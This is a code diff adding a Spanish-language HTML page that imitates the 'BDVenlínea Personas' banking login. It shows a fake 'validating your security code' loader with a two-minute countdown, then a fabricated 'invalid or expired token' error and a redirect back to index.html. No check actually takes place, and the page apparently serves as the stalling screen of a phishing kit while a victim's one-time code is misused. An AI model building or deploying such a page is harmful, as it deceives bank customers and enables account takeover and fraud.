@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlínea Personas</title>
+    <style>
+        body { background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        .login-card { background-color: white; padding: 45px 30px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); text-align: center; width: 85%; max-width: 320px; }
+        .logo { width: 180px; margin-bottom: 30px; }
+        .info-text { color: #666; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        
+        .loader-bdv { display: flex; justify-content: center; align-items: center; gap: 4px; height: 40px; margin: 20px 0; }
+        .bar { width: 5px; height: 15px; background-color: #2c4d6d; border-radius: 2px; animation: bdv-loading 1s ease-in-out infinite; }
+        .bar:nth-child(1) { animation-delay: 0.1s; } .bar:nth-child(2) { animation-delay: 0.2s; } .bar:nth-child(3) { animation-delay: 0.3s; } .bar:nth-child(4) { animation-delay: 0.4s; } .bar:nth-child(5) { animation-delay: 0.5s; }
+        @keyframes bdv-loading { 0%, 100% { height: 15px; } 50% { height: 35px; } }
+
+        .timer-text { color: #888; font-size: 14px; margin-top: 10px; }
+        .error-msg { display: none; color: #eb1c24; font-weight: bold; font-size: 16px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <img src="logo.png" class="logo">
+
+    <div id="espera">
+        <div class="info-text">Validando su código de seguridad...</div>
+        <div class="loader-bdv">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+        <div class="timer-text">Tiempo estimado: <span id="minutos">2</span>:<span id="segundos">00</span></div>
+    </div>
+
+    <div id="error" class="error-msg">
+        ⚠️ Token inválido o expirado. <br>
+        <span style="font-size: 12px; color: #666; font-weight: normal;">Por favor, verifique e intente de nuevo.</span>
+    </div>
+</div>
+
+<script>
+    let totalSeconds = 120; // 2 minutos
+    const minEl = document.getElementById('minutos');
+    const segEl = document.getElementById('segundos');
+
+    const interval = setInterval(() => {
+        totalSeconds--;
+        let mins = Math.floor(totalSeconds / 60);
+        let secs = totalSeconds % 60;
+
+        minEl.textContent = mins;
+        segEl.textContent = secs < 10 ? '0' + secs : secs;
+
+        if (totalSeconds <= 0) {
+            clearInterval(interval);
+            document.getElementById('espera').style.display = 'none';
+            document.getElementById('error').style.display = 'block';
+            
+            // Regresar al inicio después de 4 segundos de ver el error
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 4000);
+        }
+    }, 1000);
+</script>
+</body>
+</html>
